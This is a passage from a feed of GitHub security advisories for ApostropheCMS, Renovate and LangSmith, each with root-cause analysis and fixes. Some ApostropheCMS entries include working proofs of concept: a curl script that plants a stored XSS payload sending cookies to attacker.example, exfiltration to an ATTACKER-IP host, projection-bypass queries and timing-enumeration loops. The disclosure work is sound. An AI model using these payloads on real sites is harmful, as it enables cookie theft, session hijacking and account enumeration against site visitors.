<li>Set <strong>Schema Type</strong> to "Web page"</li>
<li>Save and publish the page</li>
<li>Have an administrator visit the page</li>
</ol>
<h2 id="result">Result</h2>
<ul>
<li><p>The payload executes in the admin’s browser</p>
</li>
<li><p>The script sends a request to: <code>/api/v1/@apostrophecms/user</code></p>
</li>
<li><p>The response contains sensitive user data:</p>
<ul>
<li>usernames</li>
<li>email addresses</li>
<li>roles (including admin)</li>
</ul>
</li>
<li><p>The data is exfiltrated to the attacker-controlled server:</p>
<ul>
<li><code>http://ATTACKER-IP:5656</code></li>
</ul>
</li>
</ul>
<h2 id="evidence">Evidence</h2>
<ul>
<li>The attacker server receives:<ul>
<li><code>GET /?data=BASE64_ENCODED_RESPONSE</code></li>
</ul>
</li>
<li>Decoding the response reveals sensitive application data.</li>
</ul>
<h2 id="security-impact">Security Impact</h2>
<p>This vulnerability allows an attacker to:</p>
<ul>
<li>Execute arbitrary JavaScript in an authenticated admin context</li>
<li>Perform authenticated API requests (session riding)</li>
<li>Access sensitive application data via internal APIs</li>
<li>Exfiltrate sensitive data to an external attacker-controlled server</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-855c-r2vq-c292">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-855c-r2vq-c292</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35569">https://nvd.nist.gov/vuln/detail/CVE-2026-35569</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/0e57dd07a56ae1ba1e3af646ba026db4d0ab5bb3">https://github.com/apostrophecms/apostrophe/commit/0e57dd07a56ae1ba1e3af646ba026db4d0ab5bb3</a></li>
<li><a href="https://github.com/advisories/GHSA-855c-r2vq-c292">https://github.com/advisories/GHSA-855c-r2vq-c292</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-855c-r2vq-c292</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-16T20:44:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apostrophe] ApostropheCMS: Stored XSS via CSS Custom Property Injection in @apostrophecms/color-field Escaping Style Tag Context]]></title>
        <id>https://github.com/advisories/GHSA-97v6-998m-fp4g</id>
        <link href="https://github.com/advisories/GHSA-97v6-998m-fp4g"/>
        <updated>2026-04-16T20:42:39.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>@apostrophecms/color-field</code> module bypasses color validation for values prefixed with <code>--</code> (intended for CSS custom properties), but performs no HTML sanitization on these values. When styles containing attacker-controlled color values are rendered into <code>&lt;style&gt;</code> tags — both in the global stylesheet (editors only) and in per-widget style elements (all visitors) — the lack of escaping allows an editor to inject <code>&lt;/style&gt;</code> followed by arbitrary HTML/JavaScript, achieving stored XSS against all site visitors.</p>
<h2 id="details">Details</h2>
<p><strong>Root Cause 1: Validation bypass in color field</strong> (<code>modules/@apostrophecms/color-field/index.js:36</code>)</p>
<p>The color field's <code>convert</code> method uses TinyColor to validate color values, but exempts any value starting with <code>--</code>:</p>
<pre><code class="language-javascript">// modules/@apostrophecms/color-field/index.js:26-38
async convert(req, field, data, destination) {
  destination[field.name] = self.apos.launder.string(data[field.name]);
  // ...
  const test = new TinyColor(destination[field.name]);
  if (!test.isValid &amp;&amp; !destination[field.name].startsWith('--')) {
    destination[field.name] = null;
  }
},
</code></pre>
<p>A value like <code>--x: red}&lt;/style&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;style&gt;</code> passes validation because it starts with <code>--</code>. The <code>launder.string()</code> call performs type coercion only — it does not strip HTML metacharacters like <code>&lt;</code>, <code>&gt;</code>, or <code>/</code>.</p>
<p><strong>Root Cause 2a: Unescaped rendering in widget styles (public path)</strong> (<code>modules/@apostrophecms/styles/lib/methods.js:232-234</code>)</p>
<p>The <code>getWidgetElements()</code> method concatenates the CSS string directly into a <code>&lt;style&gt;</code> tag:</p>
<pre><code class="language-javascript">// modules/@apostrophecms/styles/lib/methods.js:232-234
return `&lt;style data-apos-widget-style-for="${widgetId}" data-apos-widget-style-id="${styleId}"&gt;\n` +
  css +
  '\n&lt;/style&gt;';
</code></pre>
<p>This is then marked as safe HTML via <code>template.safe()</code> in the helpers (<code>modules/@apostrophecms/styles/lib/helpers.js:17-20</code>), and rendered for <strong>all visitors</strong> on any page containing a styled widget (<code>modules/@apostrophecms/widget-type/index.js:426-432</code>).</p>
<p><strong>Root Cause 2b: Unescaped rendering in global stylesheet (editor path)</strong> (<code>modules/@apostrophecms/template/index.js:1164-1165</code>)</p>
<p>The <code>renderNodes()</code> function returns <code>node.raw</code> without escaping:</p>
<pre><code class="language-javascript">// modules/@apostrophecms/template/index.js:1164-1165
if (node.raw != null) {
  return node.raw;
}
</code></pre>
<p>Style nodes containing the malicious color values are rendered as raw HTML, affecting editors and admins who can <code>view-draft</code>.</p>
<h2 id="poc">PoC</h2>
<p><strong>Prerequisites:</strong> An account with <code>editor</code> role on an Apostrophe 4.x instance. The site must have at least one piece or page type with a color field used in styles configuration.</p>
<p><strong>Step 1: Authenticate and obtain a CSRF token and session cookie.</strong></p>
<pre><code class="language-bash"># Login as editor
COOKIE_JAR=$(mktemp)
curl -s -c "$COOKIE_JAR" -X POST http://localhost:3000/api/v1/@apostrophecms/login/login \
  -H "Content-Type: application/json" \
  -d '{"username":"editor","password":"editor123"}'

# Extract CSRF token
CSRF=$(curl -s -b "$COOKIE_JAR" http://localhost:3000/api/v1/@apostrophecms/i18n/locale/en | grep -o '"csrfToken":"[^"]*"' | cut -d'"' -f4)
</code></pre>
<p><strong>Step 2: Create or update a piece/page with a malicious color value in a styled widget.</strong></p>
<p>The exact API route depends on the site's widget configuration. For a widget type that uses a color field in its styles schema (e.g., a <code>background-color</code> style property):</p>
<pre><code class="language-bash"># Inject XSS payload via color field in widget styles
# The --x prefix bypasses TinyColor validation
PAYLOAD='--x: red}&lt;/style&gt;&lt;img src=x onerror="fetch(`https://attacker.example/steal?c=`+document.cookie)"&gt;&lt;style&gt;'

curl -s -b "$COOKIE_JAR" -X POST \
  "http://localhost:3000/api/v1/@apostrophecms/page" \
  -H "Content-Type: application/json" \
  -H "X-XSRF-TOKEN: $CSRF" \
  -d '{
    "slug": "/xss-test",
    "title": "Test Page",
    "type": "default-page",
    "main": {
      "items": [{
        "type": "some-widget",
        "styles": {
          "backgroundColor": "'"$PAYLOAD"'"
        }
      }]
    }
  }'
</code></pre>
<p><strong>Step 3: Publish the page.</strong></p>
<pre><code class="language-bash">curl -s -b "$COOKIE_JAR" -X POST \
  "http://localhost:3000/api/v1/@apostrophecms/page/{pageId}/publish" \
  -H "X-XSRF-TOKEN: $CSRF"
</code></pre>
<p><strong>Step 4: Any visitor navigates to the published page.</strong></p>
<pre><code class="language-bash"># As an unauthenticated visitor
curl -s http://localhost:3000/xss-test | grep -A2 'onerror'
</code></pre>
<p><strong>Expected (safe):</strong> The color value is escaped or rejected.</p>
<p><strong>Actual:</strong> The rendered HTML contains:</p>
<pre><code class="language-html">&lt;style data-apos-widget-style-for="..." data-apos-widget-style-id="..."&gt;
.apos-widget-style-... { background-color: --x: red}&lt;/style&gt;&lt;img src=x onerror="fetch(`https://attacker.example/steal?c=`+document.cookie)"&gt;&lt;style&gt;; }
&lt;/style&gt;
</code></pre>
<p>The injected <code>&lt;/style&gt;</code> closes the style tag, and the <code>&lt;img onerror&gt;</code> executes JavaScript in the visitor's browser.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Stored XSS on public pages (Path B):</strong> An editor can inject JavaScript that executes for <strong>every visitor</strong> to any page containing the affected widget. This enables mass cookie theft, session hijacking, keylogging, phishing overlays, and drive-by malware delivery against the site's entire audience.</li>
<li><strong>Privilege escalation (Path A):</strong> An editor can steal admin session tokens from higher-privileged users viewing draft content, escalating to full administrative control of the CMS.</li>
<li><strong>Persistence:</strong> The payload is stored in the database and survives restarts. It executes on every page load until the content is manually edited.</li>
<li><strong>No CSP mitigation:</strong> Apostrophe does not enforce a strict Content-Security-Policy by default, so inline script execution is not blocked.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p><strong>Fix 1: Sanitize color values in the color field's <code>convert</code> method</strong> (<code>modules/@apostrophecms/color-field/index.js</code>):</p>
<pre><code class="language-javascript">// Before (line 36):
if (!test.isValid &amp;&amp; !destination[field.name].startsWith('--')) {
  destination[field.name] = null;
}

// After:
if (!test.isValid &amp;&amp; !destination[field.name].startsWith('--')) {
  destination[field.name] = null;
} else if (destination[field.name].startsWith('--')) {
  // CSS custom property names: only allow alphanumeric, hyphens, underscores
  if (!/^--[a-zA-Z0-9_-]+$/.test(destination[field.name])) {
    destination[field.name] = null;
  }
}
</code></pre>
<p><strong>Fix 2: Escape CSS output in <code>getWidgetElements</code></strong> (<code>modules/@apostrophecms/styles/lib/methods.js</code>):</p>
<pre><code class="language-javascript">// Before (line 232-234):
return `&lt;style data-apos-widget-style-for="${widgetId}" data-apos-widget-style-id="${styleId}"&gt;\n` +
  css +
  '\n&lt;/style&gt;';

// After:
const sanitizedCss = css.replace(/&lt;\//g, '&lt;\\/');
return `&lt;style data-apos-widget-style-for="${widgetId}" data-apos-widget-style-id="${styleId}"&gt;\n` +
  sanitizedCss +
  '\n&lt;/style&gt;';
</code></pre>
<p>Both fixes should be applied: Fix 1 provides input validation (defense in depth at the data layer), and Fix 2 provides output encoding (preventing style tag breakout regardless of the input source).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-97v6-998m-fp4g">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-97v6-998m-fp4g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33889">https://nvd.nist.gov/vuln/detail/CVE-2026-33889</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/6a89bdb7acdb2e1e9bf1429961a6ba7f99410481">https://github.com/apostrophecms/apostrophe/commit/6a89bdb7acdb2e1e9bf1429961a6ba7f99410481</a></li>
<li><a href="https://github.com/advisories/GHSA-97v6-998m-fp4g">https://github.com/advisories/GHSA-97v6-998m-fp4g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-97v6-998m-fp4g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-16T20:42:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apostrophe] ApostropheCMS: publicApiProjection Bypass via project Query Builder in Piece-Type REST API]]></title>
        <id>https://github.com/advisories/GHSA-xhq9-58fw-859p</id>
        <link href="https://github.com/advisories/GHSA-xhq9-58fw-859p"/>
        <updated>2026-04-16T20:42:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>getRestQuery</code> method in the <code>@apostrophecms/piece-type</code> module checks whether a MongoDB projection has already been set before applying the admin-configured <code>publicApiProjection</code>. An unauthenticated attacker can supply a <code>project</code> query parameter in the REST API request to pre-populate the projection state, causing the security-enforced <code>publicApiProjection</code> to be skipped entirely. This allows disclosure of fields that the site administrator explicitly restricted from public access.</p>
<h2 id="details">Details</h2>
<p>When an unauthenticated user queries the piece-type REST API, the <code>getRestQuery</code> method processes the request at <code>modules/@apostrophecms/piece-type/index.js:1120</code>:</p>
<pre><code class="language-javascript">// piece-type/index.js:1120-1137
getRestQuery(req, omitPermissionCheck = false) {
  const query = self.find(req).attachments(true);
  query.applyBuildersSafely(req.query);          // [1] attacker input applied first
  if (!omitPermissionCheck &amp;&amp; !self.canAccessApi(req)) {
    if (!self.options.publicApiProjection) {
      query.and({
        _id: null
      });
    } else if (!query.state.project) {            // [2] checks if projection already set
      query.project({
        ...self.options.publicApiProjection,
        cacheInvalidatedAt: 1
      });
    }
  }
  return query;
},
</code></pre>
<p>At <strong>[1]</strong>, <code>applyBuildersSafely</code> iterates over all query string parameters and invokes their corresponding builder methods. The <code>project</code> builder exists in <code>@apostrophecms/doc-type</code> with a <code>launder</code> method (<code>doc-type/index.js:1876</code>) that sanitizes values to booleans:</p>
<pre><code class="language-javascript">// doc-type/index.js:1875-1889
project: {
  launder (p) {
    if (!p || typeof p !== 'object' || Array.isArray(p)) {
      return {};
    }
    const projection = Object.entries(p).reduce((acc, [ key, val ]) =&gt; {
      return {
        ...acc,
        [key]: self.apos.launder.boolean(val)
      };
    }, {});
    return projection;
  },
</code></pre>
<p>When a request includes <code>?project[someField]=1</code>, the builder sets <code>query.state.project</code> to <code>{someField: true}</code>. At <strong>[2]</strong>, the conditional <code>!query.state.project</code> evaluates to <code>false</code> because the state is already populated, so the <code>publicApiProjection</code> is never applied.</p>
<p>For comparison, the <code>@apostrophecms/page</code> module's equivalent method (<code>page/index.js:2953</code>) unconditionally applies the projection:</p>
<pre><code class="language-javascript">// page/index.js:2953-2958
} else {
  query.project({
    ...self.options.publicApiProjection,
    cacheInvalidatedAt: 1
  });
}
</code></pre>
<h2 id="poc">PoC</h2>
<p><strong>Prerequisites:</strong> An ApostropheCMS 4.x instance with a piece-type (e.g., <code>article</code>) that has <code>publicApiProjection</code> configured to restrict fields. For example:</p>
<pre><code class="language-javascript">// modules/article/index.js
module.exports = {
  extend: '@apostrophecms/piece-type',
  options: {
    publicApiProjection: {
      title: 1,
      _url: 1
    }
  }
};
</code></pre>
<p><strong>Step 1:</strong> Normal request — observe restricted fields are hidden:</p>
<pre><code class="language-bash">curl 'http://localhost:3000/api/v1/article'
</code></pre>
<p>Response returns only <code>title</code> and <code>_url</code> fields per the configured projection.</p>
<p><strong>Step 2:</strong> Bypass projection by supplying <code>project</code> query parameter:</p>
<pre><code class="language-bash">curl 'http://localhost:3000/api/v1/article?project[internalNotes]=1&amp;project[title]=1&amp;project[slug]=1&amp;project[createdAt]=1'
</code></pre>
<p>Response now includes <code>internalNotes</code>, <code>slug</code>, <code>createdAt</code>, and any other requested fields — bypassing the admin-configured <code>publicApiProjection</code> restriction.</p>
<p><strong>Step 3:</strong> Request all default fields by projecting inclusion of sensitive fields:</p>
<pre><code class="language-bash">curl 'http://localhost:3000/api/v1/article?project[_id]=1&amp;project[title]=1&amp;project[slug]=1&amp;project[visibility]=1&amp;project[type]=1&amp;project[createdAt]=1&amp;project[updatedAt]=1'
</code></pre>
<p>All requested fields are returned, confirming the <code>publicApiProjection</code> is fully bypassed.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Information Disclosure:</strong> An unauthenticated attacker can read any field on documents that are already publicly queryable, bypassing administrator-configured field restrictions. This may expose internal notes, draft content, metadata, or other sensitive fields the administrator intentionally hid from the public API.</li>
<li><strong>Scope:</strong> Affects all piece-type modules with <code>publicApiProjection</code> configured. The attacker cannot access documents they wouldn't otherwise be able to query (document-level permissions still apply), but they can read any field on accessible documents.</li>
<li><strong>Exploitability:</strong> Trivial — requires only appending query parameters to a public URL. No authentication, special tools, or chaining required.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Remove the conditional check on <code>query.state.project</code> in <code>piece-type/index.js</code>, matching the page module's unconditional behavior. The admin-configured <code>publicApiProjection</code> should always override any user-supplied projection for unauthenticated users:</p>
<pre><code class="language-javascript">// modules/@apostrophecms/piece-type/index.js:1123-1134
// BEFORE (vulnerable):
if (!omitPermissionCheck &amp;&amp; !self.canAccessApi(req)) {
  if (!self.options.publicApiProjection) {
    query.and({
      _id: null
    });
  } else if (!query.state.project) {
    query.project({
      ...self.options.publicApiProjection,
      cacheInvalidatedAt: 1
    });
  }
}

// AFTER (fixed):
if (!omitPermissionCheck &amp;&amp; !self.canAccessApi(req)) {
  if (!self.options.publicApiProjection) {
    query.and({
      _id: null
    });
  } else {
    query.project({
      ...self.options.publicApiProjection,
      cacheInvalidatedAt: 1
    });
  }
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-xhq9-58fw-859p">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-xhq9-58fw-859p</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33888">https://nvd.nist.gov/vuln/detail/CVE-2026-33888</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/00d472804bb622df36a761b6f2cf2b33b2d4ce80">https://github.com/apostrophecms/apostrophe/commit/00d472804bb622df36a761b6f2cf2b33b2d4ce80</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/6c2b548dec2e3f7a82e8e16736603f4cd17525aa">https://github.com/apostrophecms/apostrophe/commit/6c2b548dec2e3f7a82e8e16736603f4cd17525aa</a></li>
<li><a href="https://github.com/advisories/GHSA-xhq9-58fw-859p">https://github.com/advisories/GHSA-xhq9-58fw-859p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xhq9-58fw-859p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-16T20:42:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apostrophe] ApostropheCMS: User Enumeration via Timing Side Channel in Password Reset Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-mj7r-x3h3-7rmr</id>
        <link href="https://github.com/advisories/GHSA-mj7r-x3h3-7rmr"/>
        <updated>2026-04-16T20:42:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The password reset endpoint (<code>/api/v1/@apostrophecms/login/reset-request</code>) exhibits a measurable timing side channel that allows unauthenticated attackers to enumerate valid usernames and email addresses. When a user is not found, the handler returns after a fixed 2-second artificial delay, but when a valid user is found, it performs database writes and SMTP operations with no equivalent delay normalization, producing a distinguishable timing profile.</p>
<h2 id="details">Details</h2>
<p>The <code>resetRequest</code> handler in <code>modules/@apostrophecms/login/index.js</code> attempts to obscure the user-not-found path with an artificial delay, but fails to normalize the timing of the user-found path:</p>
<p><strong>User not found — fixed 2000ms delay</strong> (<code>index.js:309-314</code>):</p>
<pre><code class="language-javascript">if (!user) {
  await wait();  // wait = (t = 2000) =&gt; Promise.delay(t)
  self.apos.util.error(
    `Reset password request error - the user ${email} doesn\`t exist.`
  );
  return;
}
</code></pre>
<p><strong>User found — variable-duration DB + SMTP operations, no artificial delay</strong> (<code>index.js:323-355</code>):</p>
<pre><code class="language-javascript">const reset = self.apos.util.generateId();
user.passwordReset = reset;
user.passwordResetAt = new Date();
await self.apos.user.update(req, user, { permissions: false });
// ... URL construction ...
await self.email(req, 'passwordResetEmail', {
  user,
  url: parsed.toString(),
  site
}, {
  to: user.email,
  subject: req.t('apostrophe:passwordResetRequest', { site })
});
</code></pre>
<p>The user-found path includes a MongoDB <code>update()</code> call and an SMTP <code>email()</code> send, which together produce response times that differ measurably from the fixed 2000ms delay. Depending on SMTP server latency, responses for valid users will either be noticeably faster (local/fast SMTP) or slower (remote SMTP) than the constant 2-second delay for invalid users.</p>
<p>Additionally, the <code>getPasswordResetUser</code> method (<code>index.js:664-666</code>) accepts both username and email via an <code>$or</code> query, enabling enumeration of both identifiers:</p>
<pre><code class="language-javascript">const criteriaOr = [
  { username: email },
  { email }
];
</code></pre>
<p>There is no rate limiting on the reset endpoint. The <code>checkLoginAttempts</code> throttle (<code>index.js:978</code>) is only applied to the login flow, allowing unlimited rapid probing of the reset endpoint.</p>
<h2 id="poc">PoC</h2>
<p><strong>Prerequisites:</strong> An Apostrophe instance with <code>passwordReset: true</code> enabled in <code>@apostrophecms/login</code> configuration.</p>
<p><strong>Step 1 — Baseline invalid user timing:</strong></p>
<pre><code class="language-bash">for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{time_total}\n" \
    -X POST http://localhost:3000/api/v1/@apostrophecms/login/reset-request \
    -H "Content-Type: application/json" \
    -d '{"email": "nonexistent-user-'$i'@example.com"}'
done
# Expected: all responses cluster tightly around 2.0xx seconds
</code></pre>
<p><strong>Step 2 — Test known valid user:</strong></p>
<pre><code class="language-bash">for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{time_total}\n" \
    -X POST http://localhost:3000/api/v1/@apostrophecms/login/reset-request \
    -H "Content-Type: application/json" \
    -d '{"email": "admin"}'
done
# Expected: response times differ from 2.0s baseline (faster with local SMTP, slower with remote SMTP)
</code></pre>
<p><strong>Step 3 — Statistical comparison:</strong>
The two distributions will show a measurable divergence. With a local mail server, valid-user responses typically complete in &lt;500ms. With a remote SMTP server, valid-user responses may take 3-5+ seconds. Either way, the timing is distinguishable from the fixed 2000ms invalid-user delay.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Account enumeration:</strong> An unauthenticated attacker can determine whether a given username or email address has an account in the Apostrophe instance.</li>
<li><strong>Credential stuffing preparation:</strong> Confirmed valid accounts can be targeted with credential stuffing attacks using breached password databases.</li>
<li><strong>Phishing targeting:</strong> Knowledge of valid accounts enables targeted phishing campaigns against confirmed users.</li>
<li><strong>No rate limiting:</strong> The absence of throttling on the reset endpoint allows high-speed automated enumeration.</li>
<li><strong>Mitigating factor:</strong> The <code>passwordReset</code> option defaults to <code>false</code> (<code>index.js:62</code>), so only instances that explicitly enable password reset are affected.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Normalize all code paths to a constant minimum duration, ensuring the response time does not leak whether a user was found:</p>
<pre><code class="language-javascript">async resetRequest(req) {
  const MIN_RESPONSE_TIME = 2000;
  const startTime = Date.now();
  const site = (req.headers.host || '').replace(/:\d+$/, '');
  const email = self.apos.launder.string(req.body.email);
  if (!email.length) {
    throw self.apos.error('invalid', req.t('apostrophe:loginResetEmailRequired'));
  }
  let user;
  try {
    user = await self.getPasswordResetUser(req.body.email);
  } catch (e) {
    self.apos.util.error(e);
  }
  if (!user) {
    self.apos.util.error(
      `Reset password request error - the user ${email} doesn\`t exist.`
    );
  } else if (!user.email) {
    self.apos.util.error(
      `Reset password request error - the user ${user.username} doesn\`t have an email.`
    );
  } else {
    const reset = self.apos.util.generateId();
    user.passwordReset = reset;
    user.passwordResetAt = new Date();
    await self.apos.user.update(req, user, { permissions: false });
    let port = (req.headers.host || '').split(':')[1];
    if (!port || [ '80', '443' ].includes(port)) {
      port = '';
    } else {
      port = `:${port}`;
    }
    const parsed = new URL(
      req.absoluteUrl,
      self.apos.baseUrl
        ? undefined
        : `${req.protocol}://${req.hostname}${port}`
    );
    parsed.pathname = self.login();
    parsed.search = '?';
    parsed.searchParams.append('reset', reset);
    parsed.searchParams.append('email', user.email);
    try {
      await self.email(req, 'passwordResetEmail', {
        user,
        url: parsed.toString(),
        site
      }, {
        to: user.email,
        subject: req.t('apostrophe:passwordResetRequest', { site })
      });
    } catch (err) {
      self.apos.util.error(`Error while sending email to ${user.email}`, err);
    }
  }
  // Pad all paths to a constant minimum duration
  const elapsed = Date.now() - startTime;
  if (elapsed &lt; MIN_RESPONSE_TIME) {
    await Promise.delay(MIN_RESPONSE_TIME - elapsed);
  }
},
</code></pre>
<p>Additionally, consider applying rate limiting to the <code>reset-request</code> endpoint to prevent high-speed enumeration attempts.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-mj7r-x3h3-7rmr">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-mj7r-x3h3-7rmr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33877">https://nvd.nist.gov/vuln/detail/CVE-2026-33877</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/e266cffd8c0d331a9b05c92bf11616556efcdc77">https://github.com/apostrophecms/apostrophe/commit/e266cffd8c0d331a9b05c92bf11616556efcdc77</a></li>
<li><a href="https://github.com/advisories/GHSA-mj7r-x3h3-7rmr">https://github.com/advisories/GHSA-mj7r-x3h3-7rmr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mj7r-x3h3-7rmr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-04-16T20:42:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[renovate] Renovate affected by remote code execution was possible using the bazel-module or bazelisk managers, when using lockFileMaintenance]]></title>
        <id>https://github.com/advisories/GHSA-5vjq-5jmg-39xq</id>
        <link href="https://github.com/advisories/GHSA-5vjq-5jmg-39xq"/>
        <updated>2026-04-16T01:34:40.000Z</updated>
        <content type="html"><![CDATA[<p>When using <a href="https://docs.renovatebot.com/configuration-options/#lockfilemaintenance"><code>lockFileMaintenance</code></a> using the <a href="https://docs.renovatebot.com/modules/manager/bazel-module/">bazel-module</a> or <a href="https://docs.renovatebot.com/modules/manager/bazelisk/">bazelisk</a> managers between Renovate <a href="https://github.com/renovatebot/renovate/releases/tag/43.65.0">43.65.0</a> (2026-03-12) and <a href="https://github.com/renovatebot/renovate/releases/tag/43.102.11">43.102.11</a> (2026-04-02), there was the opportunity for remote code execution from a malicious dependency, <em>if the Bazel module executes code that relies on a dependency</em>.</p>
<p>As this is an "unsafe" execution path, we have disabled this by default, and self-hosted administrators must add it to the <a href="https://docs.renovatebot.com/self-hosted-configuration/#allowedunsafeexecutions"><code>allowedUnsafeExecutions</code></a> allowlist.</p>
<p>It is recommended to review whether you have enabled this functionality for these managers, and if so, whether any dependency updates may have led to remote code execution.</p>
<h2 id="impact">Impact</h2>
<p>If Renovate suggested an update to a malicious dependency, <em>and</em> that dependency is referenced as part of the <code>bazel mod deps</code> call - for instance as part of a <code>ctx.execute</code> call - this would call attacker-controlled code.</p>
<p>This could lead to <a href="https://docs.renovatebot.com/security-and-permissions/#execution-of-code-insider-attack">insider attackers</a> and <a href="https://docs.renovatebot.com/security-and-permissions/#execution-of-code-outsider-attack">outside attackers</a>, executing code that is distributed as part of the package.</p>
<h2 id="patches">Patches</h2>
<p>This is patched in <a href="https://github.com/renovatebot/renovate/releases/tag/43.102.11">43.102.11</a>.</p>
<p>This does not affect any versions of <a href="https://www.mend.io/renovate/">Mend Renovate Self-Hosted</a>.</p>
<h2 id="workarounds">Workarounds</h2>
<ul>
<li>Upgrade your Renovate version</li>
<li>Disable <code>lockFileMaintenance</code> for these managers</li>
</ul>
<h2 id="why-did-this-happen">Why did this happen?</h2>
<p>This was missed in code review (as part of <a href="https://github.com/renovatebot/renovate/pull/41507">https://github.com/renovatebot/renovate/pull/41507</a>).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/renovatebot/renovate/security/advisories/GHSA-5vjq-5jmg-39xq">https://github.com/renovatebot/renovate/security/advisories/GHSA-5vjq-5jmg-39xq</a></li>
<li><a href="https://github.com/renovatebot/renovate/releases/tag/43.102.11">https://github.com/renovatebot/renovate/releases/tag/43.102.11</a></li>
<li><a href="https://github.com/advisories/GHSA-5vjq-5jmg-39xq">https://github.com/advisories/GHSA-5vjq-5jmg-39xq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5vjq-5jmg-39xq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-16T01:34:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langsmith] LangSmith SDK: Streaming token events bypass output redaction]]></title>
        <id>https://github.com/advisories/GHSA-rr7j-v2q5-chgv</id>
        <link href="https://github.com/advisories/GHSA-rr7j-v2q5-chgv"/>
        <updated>2026-04-16T01:20:38.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The LangSmith SDK's output redaction controls (hideOutputs in JS, hide_outputs in Python) do not apply to streaming token events. When an LLM run produces streaming output, each chunk is recorded as a new_token event containing the raw token value. These events bypass the redaction pipeline entirely — prepareRunCreateOrUpdateInputs (JS) and _hide_run_outputs (Python) only process the inputs and outputs fields on a run, never the events array. As a result, applications relying on output redaction to prevent sensitive LLM output from being stored in LangSmith will still leak the full streamed content via run events.</p>
<h2 id="details">Details</h2>
<p><strong>Both JS and Python SDKs are affected.</strong> The same pattern exists in both:</p>
<ul>
<li><strong>JS SDK</strong>: <code>traceable.ts:997-1003</code> and <code>traceable.ts:1044-1050</code></li>
<li><strong>Python SDK</strong>: <code>run_helpers.py:1924</code> and <code>run_helpers.py:1996</code></li>
</ul>
<p>In both SDKs, <code>new_token</code> events with raw <code>kwargs.token</code> values are added during streaming, and the redaction pipeline (<code>hideOutputs</code> in JS, <code>hide_outputs</code> in Python) only processes <code>inputs</code>/<code>outputs</code> — never <code>events</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-rr7j-v2q5-chgv">https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-rr7j-v2q5-chgv</a></li>
<li><a href="https://github.com/advisories/GHSA-rr7j-v2q5-chgv">https://github.com/advisories/GHSA-rr7j-v2q5-chgv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rr7j-v2q5-chgv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-16T01:20:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fastify/express] @fastify/express has a middleware authentication bypass via URL normalization gaps (duplicate slashes and semicolons)]]></title>
        <id>https://github.com/advisories/GHSA-6hw5-45gm-fj88</id>
        <link href="https://github.com/advisories/GHSA-6hw5-45gm-fj88"/>
        <updated>2026-04-16T01:03:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
